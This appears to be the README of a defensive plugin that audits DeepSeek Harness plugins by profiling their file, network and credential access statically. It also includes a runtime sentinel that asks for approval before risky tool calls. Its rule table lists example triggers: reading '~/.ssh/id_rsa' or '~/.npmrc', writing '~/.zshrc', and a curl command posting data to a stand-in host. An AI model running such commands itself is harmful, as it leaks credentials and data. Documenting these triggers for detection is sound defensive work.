{"metadata":{"description":"Security audit for DeepSeek Harness plugins: static permission profile with file/line evidence + a runtime sentinel gating credential access and unknown-host egress · DSH 插件安全审计：静态权限画像（附文件/行号证据）+ 运行时哨兵，触及凭证或向未知主机外发数据时先请你批准","id":"gh:1333770539","install_available":true,"language":"TypeScript","name":"dsh-plugin-audit","slug":"jkrandom-sudo/dsh-plugin-audit","topics":["audit","deepseek-harness","dsh","dsh-plugin","security"]},"paragraphs":[{"id":"p1s1","text":"Security audit for DeepSeek Harness plugins: static permission profile with file/line evidence + a r"},{"id":"p1s2","text":"untime sentinel gating credential access and unknown-host egress · DSH 插件安全审计：静态权限画像（附文件/行号证据）+ 运行时哨"},{"id":"p1s3","text":"兵，触及凭证或向未知主机外发数据时先请你批准"},{"id":"p2s1","text":"# dsh-plugin-audit"},{"id":"p3s1","text":"中文 · npm · DeepSeek Harness"},{"id":"p4s1","text":"**Know what a DSH plugin can do before you let it run.** `dsh-plugin-audit` profiles third-party plu"},{"id":"p4s2","text":"gins statically — which files, processes, hosts, env vars and credential paths their code touches, w"},{"id":"p4s3","text":"ith file/line evidence — and arms a runtime sentinel that asks for your approval when any tool call "},{"id":"p4s4","text":"reaches for credentials or moves data to unknown hosts."},{"id":"p5s1","text":"## What it does"},{"id":"p6s1","text":"**1. Static audit — the `plugin_audit` tool.** Point it at any plugin directory; it scans the source"},{"id":"p6s2","text":", `package.json` and `cordis.patch.yml`, then returns a permission profile card:"},{"id":"p7s1","text":"[代码示例省略，未执行]"},{"id":"p8s1","text":"The scan is **read-only by contract**: every report carries `writesPerformed: false`, and an optiona"},{"id":"p8s2","text":"l invariant companion enforces that marker at runtime."},{"id":"p9s1","text":"**2. Runtime sentinel.** A listener on the harness's `tools/pre-execute` waterfall. When a pending t"},{"id":"p9s2","text":"ool call matches a risk rule, the sentinel returns `ask` with a reason, and the host's normal approv"},{"id":"p9s3","text":"al prompt takes it from there (no approval channel → the call is denied, never silently allowed):"},{"id":"p10s1","text":"| Rule | Example that triggers an approval prompt |"},{"id":"p11s1","text":"| Any tool argument references a credential path | `read` on `~/.ssh/id_rsa`, `bash: cat ~/.npmrc` |"},{"id":"p11s2","text":"
| Shell egress toward a host outside `allowedHosts` | `curl -d @data.json https://collector.unknown"},{"id":"p11s3","text":".io/x` |
| A write tool targets a home-directory dotfile | `write` on `~/.zshrc` |"},{"id":"p12s1","text":"The audit is an aid, not a verdict — it surfaces evidence so *you* decide."},{"id":"p13s1","text":"## Compatibility"},{"id":"p14s1","text":"| Requirement | Version |"},{"id":"p15s1","text":"| DSH mainline | verified against the 2026-08-14 snapshot (web + headless profiles) |
| Node.js | `^"},{"id":"p15s2","text":"22.19.0 || >=24.0.0` |
| Cordis | `^4.0.0-rc.7` (peer) |"},{"id":"p16s1","text":"DSH is in developer preview and ships breaking changes frequently; the date above records the mainli"},{"id":"p16s2","text":"ne snapshot this release was verified against. The `./invariant` companion is exported but intention"},{"id":"p16s3","text":"ally **not** wired into `cordis.patch.yml`: stock profiles do not provide the `invariants` service, "},{"id":"p16s4","text":"and a pending row blocks boot. Profiles that do provide it can add `{ id: dsh-plugin-audit-invariant"},{"id":"p16s5","text":", name: 'dsh-plugin-audit/invariant' }`."},{"id":"p17s1","text":"## Install"},{"id":"p18s1","text":"[代码示例省略，未执行]"},{"id":"p19s1","text":"Either command registers the package in the profile's `dsh.profile.bundles` and applies this package"},{"id":"p19s2","text":"'s `cordis.patch.yml` (one row: `dsh-plugin-audit`, `sentinelEnabled: true`). Restart the profile to"},{"id":"p19s3","text":"atch.yml` (one row: `dsh-plugin-audit`, `sentinelEnabled: true`). Restart the profile to pick it up."},{"id":"p20s1","text":"## Uninstall"},{"id":"p21s1","text":"[代码示例省略，未执行]"},{"id":"p22s1","text":"Removes the dependency and the bundle row; restart the profile. The plugin writes nothing outside th"},{"id":"p22s2","text":"e profile's own dependency metadata, so there is nothing else to clean up."},{"id":"p23s1","text":"## Quick start"},{"id":"p24s1","text":"In a session on any profile where the plugin is installed, just ask:"},{"id":"p25s1","text":"[代码示例省略，未执行]"},{"id":"p26s1","text":"or let the model call the tool directly:"},{"id":"p27s1","text":"[代码示例省略，未执行]"},{"id":"p28s1","text":"- `path` (required) — the plugin's **source** directory (not an installed copy with `node_modules`)."},{"id":"p28s2","text":"
- `format` — `markdown` (default) or `json`."},{"id":"p29s1","text":"The tool returns the Markdown card above plus a JSON summary: `{ markdown, risk, filesScanned, findi"},{"id":"p29s2","text":"ngsCount, writesPerformed }`."},{"id":"p30s1","text":"The sentinel needs no invocation — once armed it watches every tool call in the session:"},{"id":"p31s1","text":"> ⚠ Tool "bash" runs curl toward "collector.unknown.io", which is not in allowedHosts. Outbound data"},{"id":"p31s2","text":" movement needs your confirmation. *(approve / deny)*"},{"id":"p32s1","text":"## Configuration"},{"id":"p33s1","text":"The bundle patch inserts one row into the profile; edit it in the profile's `cordis.patch.yml`:"},{"id":"p34s1","text":"[代码示例省略，未执行]"},{"id":"p35s1","text":"The static scanner takes no configuration and ignores `allowedHosts` — it reports every network surf"},{"id":"p35s2","text":"anner takes no configuration and ignores `allowedHosts` — it reports every network surface it finds."},{"id":"p36s1","text":"## Permissions & data"},{"id":"p37s1","text":"- **Read-only scanner** — read handles only, capped at 400 files / 256 KB per file, skipping `node_m"},{"id":"p37s2","text":"odules`, `.git`, `lib`, `dist`. The optional `dsh-plugin-audit/invariant` companion fails the sessio"},{"id":"p37s3","text":"n if a `plugin_audit` result ever loses its `writesPerformed: false` marker.
- **No network, no tele"},{"id":"p37s4","text":"metry** — the plugin makes no network calls of its own. Hosts listed in a report are extracted from "},{"id":"p37s5","text":"scanned source text, never contacted.
- **Local decisions** — `ask` verdicts are mediated by the hos"},{"id":"p37s6","text":"t's existing approval prompt; the plugin only logs the reason via `ctx.logger`.
- **Sentinel scope**"},{"id":"p37s7","text":" — it inspects the name and arguments of calls passing through `tools/pre-execute`; it does not read"},{"id":"p37s8","text":" files, env vars, or conversation content beyond the call arguments themselves."},{"id":"p38s1","text":"## Troubleshooting"},{"id":"p39s1","text":"- **`dsh-plugin-audit/invariant: pending (waiting for service: invariants)` at boot** — you wired th"},{"id":"p39s2","text":"e invariant row into a profile without the `invariants` service; remove that row (the shipped patch "},{"id":"p39s3","text":"already omits it).
- **The agent can't see `plugin_audit`** — check the package is in the profile's "},{"id":"p39s4","text":"`package.json` `dsh.profile.bundles` and that `--dump-config` shows the `dsh-plugin-audit` row, then"},{"id":"p39s5","text":" restart.
- **Legitimate commands keep asking** — add the host to `allowedHosts`, or set `sentinelEn"},{"id":"p39s6","text":"abled: false` to keep only the static auditor.
- **Fewer files scanned than expected** — the walker "},{"id":"p39s7","text":"caps at 400 files / 256 KB and skips build output; audit the package source, not an installed copy."},{"id":"p40s1","text":"### Known boundaries"},{"id":"p41s1","text":"- **Symlink targets are not followed** — the walk reads real files inside the target tree only.
